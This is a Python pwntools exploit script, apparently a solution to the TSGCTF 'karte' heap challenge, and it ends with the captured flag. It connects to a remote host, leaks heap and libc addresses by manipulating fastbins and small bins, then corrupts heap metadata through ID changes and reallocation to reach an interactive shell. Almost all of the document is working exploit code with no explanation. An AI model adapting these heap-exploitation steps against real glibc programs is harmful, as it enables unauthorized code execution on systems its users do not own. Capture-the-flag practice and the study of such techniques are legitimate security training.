from pwn import *

host = "35.221.81.216"
port = 30005
elf = ELF("karte")
libc = ELF("libc.so.6")


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


r = remote(host, port)


def recvuntil(x):
    s = r.recvuntil(x)
    # if log and verbose:
    #   print(s)
    return s.strip(x)


def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s


def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')


def sendline(s, verbose=True):
    if log and verbose:
        pass
        # print(s)
    r.sendline(s)


def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)


def interactive():
    r.interactive()


####################################

def menu(choice):
    recvuntil(b'>')
    sendline(str(choice))


# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)


def input_id(i):
    recvuntil(b'id > ')
    sendline(str(i))


def input_size(size):
    recvuntil(b'size > ')
    sendline(str(size))


def allocate(id, size):
    menu(0)
    input_id(id)
    input_size(size)


def extend(id, size):
    menu(1)
    input_id(id)
    input_size(size)


def change_id(id, new_id):
    menu(2)
    input_id(id)
    input_id(new_id)


def show(id):
    menu(3)
    input_id(id)
    recvuntil(b': ')
    id = recvuntil(b' ')
    recvuntil(b'size: ')
    size = recvuntil(b'\n')
    return int(id, 16), int(size, 16)


def deallocate(id):
    menu(4)
    input_id(id)


def write(id, content):
    menu(4)
    input_id(id)
    recvuntil(b'content: ')
    sendline(str(content))


victim = 0x404171 - 0x10
name = b'\x00' * 0x19 + p64(victim + 0x10)[:6]
recvuntil(b'name > ')

sendline(name)
allocate(100, 0x50)
allocate(101, 0x50)

# 0x50 -> fastbin heap addr leak
for i in range(9):
    allocate(i, 0x50)
for i in range(3, 9):
    deallocate(i)
deallocate(1)
deallocate(0)
deallocate(2)

allocate(102, 0x50)

x, y = show(2)
log.success("heap --> %s" % hex(y))

heap_base = y - 0x350

N = 1000

for i in range(9):
    allocate(N + i, 0x90)
for i in range(3, 9):
    deallocate(N + i)
deallocate(N + 1)
deallocate(N + 0)
deallocate(N + 2)

# -> small bin libc addr leak
allocate(200, 0xa0)

target = heap_base + 0x7f0
log.success("target heap address --> %s" % hex(target))
_, arena = show(target)
arena_offset = 0x1ebc70
libc_base = arena - arena_offset
log.success("libc_base --> %s" % hex(libc_base))

allocate(201, 0x90)
allocate(202, 0x90)

free_hook_offset = 0x1eeb28

change_id(libc_base + arena_offset, victim)
extend(100, 0x90)

menu(5)
interactive()

# FLAG --> TSGCTF{Realloc_is_all_you_need~}
